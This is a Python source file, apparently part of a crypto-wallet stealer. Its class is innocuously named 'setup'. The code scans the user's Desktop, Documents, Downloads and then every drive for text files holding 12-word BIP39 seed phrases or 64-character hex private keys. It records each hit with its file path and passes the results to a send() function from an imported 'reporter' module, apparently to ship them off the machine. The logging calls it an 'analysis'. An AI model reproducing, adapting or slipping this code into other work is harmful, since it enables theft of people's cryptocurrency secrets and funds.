import os
import re
import time
import threading
from pathlib import Path
from reporter import send
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
LOG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "analysis_log.txt")

def log(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.ctime()} - {msg}\n")
    except:
        pass

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_items = []
    
    def run(self):
        log("=== ANALYSIS STARTED ===")
        self._scan_all()
        log(f"ANALYSIS COMPLETE - Found: {len(self.found_items)}")
        if self.found_items:
            for item in self.found_items:
                self.data.append(item)
            send(self.data)
    
    def _scan_all(self):
        try:
            self._scan_priority()
            self._scan_full()
        except Exception as e:
            log(f"Error: {e}")
    
    def _scan_priority(self):
        paths = [
            os.path.expandvars("%USERPROFILE%\\Desktop"),
            os.path.expandvars("%USERPROFILE%\\Documents"),
            os.path.expandvars("%USERPROFILE%\\Downloads"),
        ]
        for path in paths:
            if os.path.exists(path):
                self._scan_dir(path, depth=3)
    
    def _scan_full(self):
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                self._scan_dir(path, skip=True)
    
    def _scan_dir(self, directory, depth=None, skip=False):
        try:
            skip_dirs = ['Windows', 'Program Files', 'System32', 'AppData\\Local\\Temp', '.git', 'node_modules']
            for root, dirs, files in os.walk(directory):
                if skip:
                    dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                if depth and root.replace(directory, '').count(os.sep) > depth:
                    continue
                for file in files:
                    self._scan_file(os.path.join(root, file))
        except:
            pass
    
    def _scan_file(self, file_path):
        try:
            if os.path.getsize(file_path) > 5 * 1024 * 1024:
                return
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if not content or len(content) < 20:
                    return
                words = re.findall(r'\b[a-zA-Z]+\b', content)
                for i in range(len(words) - 11):
                    phrase = ' '.join(words[i:i+12])
                    try:
                        if mnemo.check(phrase):
                            log(f"FOUND: {file_path}")
                            self.found_items.append({'type': 'seed', 'path': file_path, 'content': phrase})
                            return
                    except:
                        pass
                for match in re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content):
                    if len(match) == 66 and match.startswith('0x'):
                        log(f"FOUND KEY: {file_path}")
                        self.found_items.append({'type': 'key', 'path': file_path, 'content': match})
                        return
                    elif len(match) == 64 and match not in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
                        log(f"FOUND KEY: {file_path}")
                        self.found_items.append({'type': 'key', 'path': file_path, 'content': f"0x{match}"})
                        return
        except:
            pass